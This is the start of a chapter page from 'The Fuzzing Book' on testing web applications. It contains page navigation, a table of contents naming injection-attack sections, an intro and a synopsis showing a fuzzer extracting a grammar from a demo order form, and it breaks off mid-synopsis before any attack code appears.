
<!DOCTYPE html>


<html lang="en" data-content_root="./" >

  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />

    <title>Testing Web Applications &#8212; The Fuzzing Book</title>
  
  
  
  <script data-cfasync="false">
    document.documentElement.dataset.mode = localStorage.getItem("mode") || "";
    document.documentElement.dataset.theme = localStorage.getItem("theme") || "";
  </script>
  
  <!-- Loaded before other Sphinx assets -->
  <link href="_static/styles/theme.css?digest=dfe6caa3a7d634c4db9b" rel="stylesheet" />
<link href="_static/styles/bootstrap.css?digest=dfe6caa3a7d634c4db9b" rel="stylesheet" />
<link href="_static/styles/pydata-sphinx-theme.css?digest=dfe6caa3a7d634c4db9b" rel="stylesheet" />

  
  <link href="_static/vendor/fontawesome/6.5.2/css/all.min.css?digest=dfe6caa3a7d634c4db9b" rel="stylesheet" />
  <link rel="preload" as="font" type="font/woff2" crossorigin href="_static/vendor/fontawesome/6.5.2/webfonts/fa-solid-900.woff2" />
<link rel="preload" as="font" type="font/woff2" crossorigin href="_static/vendor/fontawesome/6.5.2/webfonts/fa-brands-400.woff2" />
<link rel="preload" as="font" type="font/woff2" crossorigin href="_static/vendor/fontawesome/6.5.2/webfonts/fa-regular-400.woff2" />

    <link rel="stylesheet" type="text/css" href="_static/pygments.css?v=03e43079" />
    <link rel="stylesheet" type="text/css" href="_static/styles/sphinx-book-theme.css?v=eba8b062" />
    <link rel="stylesheet" type="text/css" href="_static/togglebutton.css?v=13237357" />
    <link rel="stylesheet" type="text/css" href="_static/copybutton.css?v=76b2166b" />
    <link rel="stylesheet" type="text/css" href="_static/mystnb.8ecb98da25f57f5357bf6f572d296f466b2cfe2517ffebfabe82451661e28f02.css?v=6644e6bb" />
    <link rel="stylesheet" type="text/css" href="_static/sphinx-thebe.css?v=4fa983c6" />
    <link rel="stylesheet" type="text/css" href="_static/sphinx-design.min.css?v=95c83b7e" />
    <link rel="stylesheet" type="text/css" href="_static/custom.css?v=42e1b1a5" />
    <link rel="stylesheet" type="text/css" href="_static/mastodon-timeline.css?v=f82c2b23" />
  
  <!-- Pre-loaded scripts that we'll load fully later -->
  <link rel="preload" as="script" href="_static/scripts/bootstrap.js?digest=dfe6caa3a7d634c4db9b" />
<link rel="preload" as="script" href="_static/scripts/pydata-sphinx-theme.js?digest=dfe6caa3a7d634c4db9b" />
  <script src="_static/vendor/fontawesome/6.5.2/js/all.min.js?digest=dfe6caa3a7d634c4db9b"></script>

    <script src="_static/documentation_options.js?v=9eb32ce0"></script>
    <script src="_static/doctools.js?v=9a2dae69"></script>
    <script src="_static/sphinx_highlight.js?v=dc90522c"></script>
    <script src="_static/clipboard.min.js?v=a7894cd8"></script>
    <script src="_static/copybutton.js?v=f281be69"></script>
    <script src="_static/scripts/sphinx-book-theme.js?v=887ef09a"></script>
    <script>let toggleHintShow = 'Click to show';</script>
    <script>let toggleHintHide = 'Click to hide';</script>
    <script>let toggleOpenOnPrint = 'true';</script>
    <script src="_static/togglebutton.js?v=4a39c7ea"></script>
    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown';</script>
    <script src="_static/design-tabs.js?v=f930bc37"></script>
    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"; const thebe_selector = ".thebe,.cell"; const thebe_selector_input = "pre"; const thebe_selector_output = ".output, .cell_output"</script>
    <script async="async" src="_static/sphinx-thebe.js?v=c100c467"></script>
    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown';</script>
    <script>const THEBE_JS_URL = "https://unpkg.com/thebe@0.8.2/lib/index.js"; const thebe_selector = ".thebe,.cell"; const thebe_selector_input = "pre"; const thebe_selector_output = ".output, .cell_output"</script>
    <script>DOCUMENTATION_OPTIONS.pagename = 'WebFuzzer';</script>
    <link rel="index" title="Index" href="genindex.html" />
    <link rel="search" title="Search" href="search.html" />
    <link rel="next" title="Testing Graphical User Interfaces" href="GUIFuzzer.html" />
    <link rel="prev" title="Testing Compilers" href="PythonFuzzer.html" />
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <meta name="docsearch:language" content="en"/>
  </head>
  
  
  <body data-bs-spy="scroll" data-bs-target=".bd-toc-nav" data-offset="180" data-bs-root-margin="0px 0px -60%" data-default-mode="">

  
  
  <div id="pst-skip-link" class="skip-link d-print-none"><a href="#main-content">Skip to main content</a></div>
  
  <div id="pst-scroll-pixel-helper"></div>
  
  <button type="button" class="btn rounded-pill" id="pst-back-to-top">
    <i class="fa-solid fa-arrow-up"></i>Back to top</button>

  
  <input type="checkbox"
          class="sidebar-toggle"
          id="pst-primary-sidebar-checkbox"/>
  <label class="overlay overlay-primary" for="pst-primary-sidebar-checkbox"></label>
  
  <input type="checkbox"
          class="sidebar-toggle"
          id="pst-secondary-sidebar-checkbox"/>
  <label class="overlay overlay-secondary" for="pst-secondary-sidebar-checkbox"></label>
  
  <div class="search-button__wrapper">
    <div class="search-button__overlay"></div>
    <div class="search-button__search-container">
<form class="bd-search d-flex align-items-center"
      action="search.html"
      method="get">
  <i class="fa-solid fa-magnifying-glass"></i>
  <input type="search"
         class="form-control"
         name="q"
         id="search-input"
         placeholder="Search this book..."
         aria-label="Search this book..."
         autocomplete="off"
         autocorrect="off"
         autocapitalize="off"
         spellcheck="false"/>
  <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd>K</kbd></span>
</form></div>
  </div>

  <div class="pst-async-banner-revealer d-none">
  <aside id="bd-header-version-warning" class="d-none d-print-none" aria-label="Version warning"></aside>
</div>
<aside class="bd-header-announcement" aria-label="Announcement">
  <div class="bd-header-announcement__content"><p>This is a beta version of fuzzingbook.org, currently in development. See the <a href="https://fuzzingbook.org/classic/"  style="color:white!important;">classic site</a> for the 2024 version.</p></div>
</aside>

  
    <header class="bd-header navbar navbar-expand-lg bd-navbar d-print-none">
    </header>
  

  <div class="bd-container">
    <div class="bd-container__inner bd-page-width">
      
      
      
      <div class="bd-sidebar-primary bd-sidebar">
        

  
  <div class="sidebar-header-items sidebar-primary__section">
    
    
    
    
  </div>
  
    <div class="sidebar-primary-items__start sidebar-primary__section">
        <div class="sidebar-primary-item">

  
    
  

<a class="navbar-brand logo" href="index.html">
  
  
  
  
  
    
    
      
    
    
    <img src="_static/fuzzingbook.png" class="logo__image only-light" alt="The Fuzzing Book - Home"/>
    <script>document.write(`<img src="_static/fuzzingbook.png" class="logo__image only-dark" alt="The Fuzzing Book - Home"/>`);</script>
  
  
</a></div>
        <div class="sidebar-primary-item">

 <script>
 document.write(`
   <button class="btn search-button-field search-button__button" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
    <i class="fa-solid fa-magnifying-glass"></i>
    <span class="search-button__default-text">Search</span>
    <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd class="kbd-shortcut__modifier">K</kbd></span>
   </button>
 `);
 </script></div>
        <div class="sidebar-primary-item"><nav class="bd-links bd-docs-nav" aria-label="Main">
    <div class="bd-toc-item navbar-nav active">
        
        <ul class="nav bd-sidenav bd-sidenav__home-link">
            <li class="toctree-l1">
                <a class="reference internal" href="index.html">
                    The Fuzzing Book
                </a>
            </li>
        </ul>
        <p aria-level="2" class="caption" role="heading"><span class="caption-text">Introduction</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1"><a class="reference internal" href="Tours.html">Sitemap</a></li>
<li class="toctree-l1"><a class="reference internal" href="Intro_Testing.html">Introduction to Software Testing</a></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Lexical Fuzzing</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1"><a class="reference internal" href="Fuzzer.html">Fuzzing: Breaking Things with Random Inputs</a></li>
<li class="toctree-l1"><a class="reference internal" href="Coverage.html">Code Coverage</a></li>
<li class="toctree-l1"><a class="reference internal" href="MutationFuzzer.html">Mutation-Based Fuzzing</a></li>
<li class="toctree-l1"><a class="reference internal" href="GreyboxFuzzer.html">Greybox Fuzzing</a></li>
<li class="toctree-l1"><a class="reference internal" href="SearchBasedFuzzer.html">Search-Based Fuzzing</a></li>
<li class="toctree-l1"><a class="reference internal" href="MutationAnalysis.html">Mutation Analysis</a></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Syntactical Fuzzing</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1"><a class="reference internal" href="Grammars.html">Fuzzing with Grammars</a></li>
<li class="toctree-l1"><a class="reference internal" href="GrammarFuzzer.html">Efficient Grammar Fuzzing</a></li>
<li class="toctree-l1"><a class="reference internal" href="GrammarCoverageFuzzer.html">Grammar Coverage</a></li>
<li class="toctree-l1"><a class="reference internal" href="Parser.html">Parsing Inputs</a></li>
<li class="toctree-l1"><a class="reference internal" href="ProbabilisticGrammarFuzzer.html">Probabilistic Grammar Fuzzing</a></li>
<li class="toctree-l1"><a class="reference internal" href="GeneratorGrammarFuzzer.html">Fuzzing with Generators</a></li>

<li class="toctree-l1"><a class="reference internal" href="GreyboxGrammarFuzzer.html">Greybox Fuzzing with Grammars</a></li>
<li class="toctree-l1"><a class="reference internal" href="Reducer.html">Reducing Failure-Inducing Inputs</a></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Semantical Fuzzing</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1"><a class="reference internal" href="FuzzingWithConstraints.html">Fuzzing with Constraints</a></li>
<li class="toctree-l1"><a class="reference internal" href="GrammarMiner.html">Mining Input Grammars</a></li>
<li class="toctree-l1"><a class="reference internal" href="InformationFlow.html">Tracking Information Flow</a></li>
<li class="toctree-l1"><a class="reference internal" href="ConcolicFuzzer.html">Concolic Fuzzing</a></li>
<li class="toctree-l1"><a class="reference internal" href="SymbolicFuzzer.html">Symbolic Fuzzing</a></li>
<li class="toctree-l1"><a class="reference internal" href="DynamicInvariants.html">Mining Function Specifications</a></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Domain-Specific Fuzzing</span></p>
<ul class="current nav bd-sidenav">
<li class="toctree-l1"><a class="reference internal" href="ConfigurationFuzzer.html">Testing Configurations</a></li>
<li class="toctree-l1"><a class="reference internal" href="APIFuzzer.html">Fuzzing APIs</a></li>
<li class="toctree-l1"><a class="reference internal" href="Carver.html">Carving Unit Tests</a></li>
<li class="toctree-l1"><a class="reference internal" href="PythonFuzzer.html">Testing Compilers</a></li>
<li class="toctree-l1 current active"><a class="current reference internal" href="#">Testing Web Applications</a></li>
<li class="toctree-l1"><a class="reference internal" href="GUIFuzzer.html">Testing Graphical User Interfaces</a></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Managing Fuzzing</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1"><a class="reference internal" href="FuzzingInTheLarge.html">Fuzzing in the Large</a></li>
<li class="toctree-l1"><a class="reference internal" href="WhenToStopFuzzing.html">When To Stop Fuzzing</a></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Essays</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1"><a class="reference internal" href="AcademicPrototyping.html">Academic Prototyping</a></li>
<li class="toctree-l1"><a class="reference internal" href="PrototypingWithPython.html">Prototyping with Python</a></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">Appendices</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1"><a class="reference internal" href="ExpectError.html">Error Handling</a></li>
<li class="toctree-l1"><a class="reference internal" href="Timer.html">Timer</a></li>
<li class="toctree-l1"><a class="reference internal" href="Timeout.html">Timeout</a></li>
<li class="toctree-l1"><a class="reference internal" href="ClassDiagram.html">Class Diagrams</a></li>
<li class="toctree-l1"><a class="reference internal" href="RailroadDiagrams.html">Railroad Diagrams</a></li>
<li class="toctree-l1"><a class="reference internal" href="ControlFlow.html">Control Flow Graph</a></li>
</ul>
<p aria-level="2" class="caption" role="heading"><span class="caption-text">About This Book</span></p>
<ul class="nav bd-sidenav">
<li class="toctree-l1"><a class="reference internal" href="ReleaseNotes.html">Fuzzingbook Release Notes</a></li>
<li class="toctree-l1"><a class="reference internal" href="Importing.html">Downloads and Installation</a></li>
<li class="toctree-l1"><a class="reference internal" href="Copyright.html">Copyright</a></li>
<li class="toctree-l1"><a class="reference internal" href="Guide_for_Authors.html">Guide for Authors</a></li>
</ul>

    </div>
</nav></div>
    </div>
  
  
  <div class="sidebar-primary-items__end sidebar-primary__section">
  </div>
  
  <div id="rtd-footer-container"></div>


      </div>
      
      <main id="main-content" class="bd-main" role="main">
        
        

<div class="sbt-scroll-pixel-helper"></div>

          <div class="bd-content">
            <div class="bd-article-container">
              
              <div class="bd-header-article d-print-none">
<div class="header-article-items header-article__inner">
  
    <div class="header-article-items__start">
      
        <div class="header-article-item"><button class="sidebar-toggle primary-toggle btn btn-sm" title="Toggle primary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
  <span class="fa-solid fa-bars"></span>
</button></div>
      
    </div>
  
  
    <div class="header-article-items__end">
      
        <div class="header-article-item">

<div class="article-header-buttons">





<div class="dropdown dropdown-launch-buttons">
  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Launch interactive content">
    <i class="fas fa-rocket"></i>
  </button>
  <ul class="dropdown-menu">
      
      
      
      <li><a href="https://mybinder.org/v2/gh/uds-se/fuzzingbook/master?urlpath=tree/docs/notebooks/WebFuzzer.ipynb" target="_blank"
   class="btn btn-sm dropdown-item"
   title="Launch on Binder"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  
    <img alt="Binder logo" src="_static/images/logo_binder.svg">
  </span>
<span class="btn__text-container">Binder</span>
</a>
</li>
      
  </ul>
</div>






<div class="dropdown dropdown-source-buttons">
  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Source repositories">
    <i class="fab fa-github"></i>
  </button>
  <ul class="dropdown-menu">
      
      
      
      <li><a href="https://github.com/uds-se/fuzzingbook" target="_blank"
   class="btn btn-sm btn-source-repository-button dropdown-item"
   title="Source repository"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fab fa-github"></i>
  </span>
<span class="btn__text-container">Repository</span>
</a>
</li>
      
      
      
      
      <li><a href="https://github.com/uds-se/fuzzingbook/issues/new?title=Issue%20on%20page%20%2FWebFuzzer.html&body=Your%20issue%20content%20here." target="_blank"
   class="btn btn-sm btn-source-issues-button dropdown-item"
   title="Open an issue"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-lightbulb"></i>
  </span>
<span class="btn__text-container">Open issue</span>
</a>
</li>
      
  </ul>
</div>






<div class="dropdown dropdown-download-buttons">
  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Download this page">
    <i class="fas fa-download"></i>
  </button>
  <ul class="dropdown-menu">
    <li><a href="../code/WebFuzzer.py" target="_blank"
       class="btn btn-sm btn-download-source-button dropdown-item"
       title="Download Python code"
       data-bs-placement="left" data-bs-toggle="tooltip"
    >
  

    <span class="btn__icon-container">
      <i class="fas fa-file"></i>
      </span>
    <span class="btn__text-container">.py</span>
    </a>
    </li>
    
      
      
      
      <li><a href="_sources/WebFuzzer.ipynb" target="_blank"
   class="btn btn-sm btn-download-source-button dropdown-item"
   title="Download notebook"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-file"></i>
  </span>
<span class="btn__text-container">.ipynb</span>
</a>
</li>
      
      
      
      
      <li>
<button onclick="window.print()"
  class="btn btn-sm btn-download-pdf-button dropdown-item"
  title="Print to PDF"
  data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-file-pdf"></i>
  </span>
<span class="btn__text-container">.pdf</span>
</button>
</li>
      
  
    <li><a href="Importing.html" target="_blank"
       class="btn btn-sm btn-download-source-button dropdown-item"
       title="All downloads"
       data-bs-placement="left" data-bs-toggle="tooltip"
    >
  

    <span class="btn__icon-container">
      <i class="fas fa-file"></i>
      </span>
    <span class="btn__text-container">All downloads</span>
    </a>
    </li>
    </ul>
</div>




<button onclick="toggleFullScreen()"
  class="btn btn-sm btn-fullscreen-button"
  title="Fullscreen mode"
  data-bs-placement="bottom" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-expand"></i>
  </span>

</button>



<script>
document.write(`
  <button class="btn btn-sm nav-link pst-navbar-icon theme-switch-button" title="light/dark" aria-label="light/dark" data-bs-placement="bottom" data-bs-toggle="tooltip">
    <i class="theme-switch fa-solid fa-sun fa-lg" data-mode="light"></i>
    <i class="theme-switch fa-solid fa-moon fa-lg" data-mode="dark"></i>
    <i class="theme-switch fa-solid fa-circle-half-stroke fa-lg" data-mode="auto"></i>
  </button>
`);
</script>


<script>
document.write(`
  <button class="btn btn-sm pst-navbar-icon search-button search-button__button" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
    <i class="fa-solid fa-magnifying-glass fa-lg"></i>
  </button>
`);
</script>
<button class="sidebar-toggle secondary-toggle btn btn-sm" title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
    <span class="fa-solid fa-list"></span>
</button>
</div></div>
      
    </div>
  
</div>
</div>
              
              

<div id="jb-print-docs-body" class="onlyprint">
    <h1>Testing Web Applications</h1>
    <!-- Table of contents -->
    <div id="print-main-content">
        <div id="jb-print-toc">
            
            <div>
                <h2> Contents </h2>
            </div>
            <nav aria-label="Page">
                <ul class="visible nav section-nav flex-column">
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#synopsis">Synopsis</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#fuzzing-web-forms">Fuzzing Web Forms</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#sql-injection-attacks">SQL Injection Attacks</a></li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#a-web-user-interface">A Web User Interface</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#excursion-implementing-a-web-server">Excursion: Implementing a Web Server</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#taking-orders">Taking Orders</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#order-confirmation">Order Confirmation</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#terms-and-conditions">Terms and Conditions</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#storing-orders">Storing Orders</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#handling-http-requests">Handling HTTP Requests</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#order-form">Order Form</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#processing-orders">Processing Orders</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#other-http-commands">Other HTTP commands</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#error-handling">Error Handling</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#page-not-found">Page Not Found</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#internal-errors">Internal Errors</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#logging">Logging</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#end-of-excursion">End of Excursion</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#running-the-server">Running the Server</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#interacting-with-the-server">Interacting with the Server</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#direct-browser-access">Direct Browser Access</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#retrieving-the-home-page">Retrieving the Home Page</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#placing-orders">Placing Orders</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#error-messages">Error Messages</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#fuzzing-input-forms">Fuzzing Input Forms</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#fuzzing-with-expected-values">Fuzzing with Expected Values</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#excursion-implementing-cgi-decode">Excursion: Implementing cgi_decode()</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id1">End of Excursion</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#fuzzing-with-unexpected-values">Fuzzing with Unexpected Values</a></li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#extracting-grammars-for-input-forms">Extracting Grammars for Input Forms</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#searching-html-for-input-fields">Searching HTML for Input Fields</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#mining-grammars-for-web-pages">Mining Grammars for Web Pages</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#a-fuzzer-for-web-forms">A Fuzzer for Web Forms</a></li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#crawling-user-interfaces">Crawling User Interfaces</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#excursion-implementing-a-crawler">Excursion: Implementing a Crawler</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#id2">End of Excursion</a></li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#crafting-web-attacks">Crafting Web Attacks</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#html-injection-attacks">HTML Injection Attacks</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#cross-site-scripting-attacks">Cross-Site Scripting Attacks</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#id3">SQL Injection Attacks</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#leaking-internal-information">Leaking Internal Information</a></li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#fully-automatic-web-attacks">Fully Automatic Web Attacks</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#lessons-learned">Lessons Learned</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#next-steps">Next Steps</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#background">Background</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#exercises">Exercises</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#exercise-1-fix-the-server">Exercise 1: Fix the Server</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-1-silent-failures">Part 1: Silent Failures</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-2-sanitized-html">Part 2: Sanitized HTML</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-3-sanitized-sql">Part 3: Sanitized SQL</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-4-a-robust-server">Part 4: A Robust Server</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-5-test-it">Part 5: Test it!</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#exercise-2-protect-the-server">Exercise 2: Protect the Server</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-1-a-blacklisting-filter">Part 1: A Blacklisting Filter</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-2-a-whitelisting-filter">Part 2: A Whitelisting Filter</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#exercise-3-input-patterns">Exercise 3: Input Patterns</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#exercise-4-coverage-driven-web-fuzzing">Exercise 4: Coverage-Driven Web Fuzzing</a></li>
</ul>
</li>
</ul>
            </nav>
        </div>
    </div>
</div>

              
                
<div id="searchbox"></div>
                <article class="bd-article">
                  
  <section class="tex2jax_ignore mathjax_ignore" id="testing-web-applications">
<h1>Testing Web Applications<a class="headerlink" href="#testing-web-applications" title="Link to this heading">#</a></h1>
<p>In this chapter, we explore how to generate tests for Graphical User Interfaces (GUIs), notably on Web interfaces.  We set up a (vulnerable) Web server and demonstrate how to systematically explore its behavior – first with handwritten grammars, then with grammars automatically inferred from the user interface.  We also show how to conduct systematic attacks on these servers, notably with code and SQL injection.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">bookutils</span><span class="w"> </span><span class="kn">import</span> <span class="n">YouTubeVideo</span>
<span class="n">YouTubeVideo</span><span class="p">(</span><span class="s1">&#39;cgtpQ2KLZC8&#39;</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html">
        <iframe
            width="640"
            height="360"
            src="https://www.youtube-nocookie.com/embed/cgtpQ2KLZC8"
            frameborder="0"
            allowfullscreen
            
        ></iframe>
        </div></div>
</div>
<section id="synopsis">
<h2>Synopsis<a class="headerlink" href="#synopsis" title="Link to this heading">#</a></h2>
<p>To <a class="reference internal" href="Importing.html"><span class="std std-doc">use the code provided in this chapter</span></a>, write</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span><span class="w"> </span><span class="nn">fuzzingbook.WebFuzzer</span><span class="w"> </span><span class="kn">import</span> <span class="o">&lt;</span><span class="n">identifier</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>and then make use of the following features.</p>
<p><strong>Note</strong>: The examples in this section only work after the rest of the cells have been executed.</p>
<section id="fuzzing-web-forms">
<h3>Fuzzing Web Forms<a class="headerlink" href="#fuzzing-web-forms" title="Link to this heading">#</a></h3>
<p><code class="docutils literal notranslate"><span class="pre">WebFormFuzzer</span></code> demonstrates how to interact with a Web form.  Given a URL with a Web form, it automatically extracts a grammar that produces a URL; this URL contains values for all form elements.  Support is limited to GET forms and a subset of HTML form elements.</p>
<p>Here’s the grammar extracted for our vulnerable Web server:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">web_form_fuzzer</span> <span class="o">=</span> <span class="n">WebFormFuzzer</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">web_form_fuzzer</span><span class="o">.</span><span class="n">grammar</span><span class="p">[</span><span class="s1">&#39;&lt;start&gt;&#39;</span><span class="p">]</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;&lt;action&gt;?&lt;query&gt;&#39;]
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">web_form_fuzzer</span><span class="o">.</span><span class="n">grammar</span><span class="p">[</span><span class="s1">&#39;&lt;action&gt;&#39;</span><span class="p">]</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;/order&#39;]
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">web_form_fuzzer</span><span class="o">.</span><span class="n">grammar</span><span class="p">[</span><span class="s1">&#39;&lt;query&gt;&#39;</span><span class="p">]</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;&lt;item&gt;&amp;&lt;name&gt;&amp;&lt;email-1&gt;&amp;&lt;city&gt;&amp;&lt;zip&gt;&amp;&lt;terms&gt;&amp;&lt;submit-1&gt;&#39;]
</pre></div>
</div>
</div>
</div>
<p>Using it for fuzzing yields a path with all form values filled; accessing this path acts like filling out and submitting the form.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
